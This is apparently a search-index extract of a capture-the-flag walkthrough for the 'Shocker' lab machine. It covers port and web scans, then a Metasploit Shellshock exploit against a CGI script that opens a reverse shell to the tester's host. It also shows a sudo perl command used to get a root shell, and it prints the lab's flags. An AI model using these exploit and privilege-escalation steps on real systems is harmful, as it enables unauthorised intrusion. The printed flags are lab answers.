Info"},{"location":"Writeups/machines/shoker/writeup/#walkthrough","text":"","title":"Walkthrough"},{"location":"Writeups/machines/shoker/writeup/#recon","text":"","title":"Recon"},{"location":"Writeups/machines/shoker/writeup/#nmap","text":"PORT STATE SERVICE REASON VERSION 80 /tcp open http syn-ack Apache httpd 2 .4.18 (( Ubuntu )) | http-methods: | _ Supported Methods: POST OPTIONS GET HEAD | _http-server-header: Apache/2.4.18 ( Ubuntu ) | _http-title: Site doesn ' t have a title ( text/html ) . 2222 /tcp open ssh syn-ack OpenSSH 7 .2p2 Ubuntu 4ubuntu2.2 ( Ubuntu Linux ; protocol 2 .0 ) | ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 ( RSA ) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH | 256 22 :8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 ( ECDSA ) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc = | 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 ( ED25519 ) | _ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk Service Info: OS: Linux ; CPE: cpe:/o:linux:linux_kernel","title":"nmap"},{"location":"Writeups/machines/shoker/writeup/#web-enumeration","text":"\u039e OldBoxes/shocker \u2192 dirb http://10.10.10.56 ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Fri Jul 2 00 :44:44 2021 URL_BASE: http://10.10.10.56/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt ----------------- GENERATED WORDS: 4612 ---- Scanning URL: http://10.10.10.56/ ---- + http://10.10.10.56/cgi-bin/ ( CODE:403 | SIZE:294 ) + http://10.10.10.56/index.html ( CODE:200 | SIZE:137 )","title":"Web Enumeration"},{"location":"Writeups/machines/shoker/writeup/#exploitation","text":"","title":"Exploitation"},{"location":"Writeups/machines/shoker/writeup/#php-cgi-shellshock-rce","text":"\u039e HTB/Boxes \u2192 msfconsole msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec msf6 exploit ( multi/http/apache_mod_cgi_bash_env_exec ) > set rhosts 10 .10.10.56 rhosts = > 10 .10.10.56 msf6 exploit ( multi/http/apache_mod_cgi_bash_env_exec ) > set lhost tun0 lhost = > tun0 msf6 exploit ( multi/http/apache_mod_cgi_bash_env_exec ) > set targeturi http://10.10.10.56/cgi-bin/user.sh targeturi = > http://10.10.10.56/cgi-bin/user.sh msf6 exploit ( multi/http/apache_mod_cgi_bash_env_exec ) > exploit [ * ] Started reverse TCP handler on 10 .10.14.27:4444 [ * ] Command Stager progress - 100 .46% done ( 1097 /1092 bytes ) [ * ] Sending stage ( 36 bytes ) to 10 .10.10.56 [ * ] Command shell session 1 opened ( 10 .10.14.27:4444 -> 10 .10.10.56:54578 ) at 2021 -07-02 01 :07:49 -0400 cd /home ls shelly cd shelly cat user.txt 3b57ccf9e22e42963b66361538597f4b","title":"PHP CGI ShellShock RCE"},{"location":"Writeups/machines/shoker/writeup/#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"Writeups/machines/shoker/writeup/#enumerate-suid","text":"sudo -l Matching Defaults entries for shelly on Shocker: env_reset, mail_badpass, secure_path = /usr/local/sbin \\: /usr/local/bin \\: /usr/sbin \\: /usr/bin \\: /sbin \\: /bin \\: /snap/bin User shelly may run the following commands on Shocker: ( root ) NOPASSWD: /usr/bin/perl","title":"Enumerate SUID"},{"location":"Writeups/machines/shoker/writeup/#obtaining-root-privileges","text":"sudo /usr/bin/perl -e 'exec \"/bin/sh\";' id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) cd /root cat root.txt ae449b79adfb43de491e9bf4bc2a9c19","title":"Obtaining Root Privileges"}]}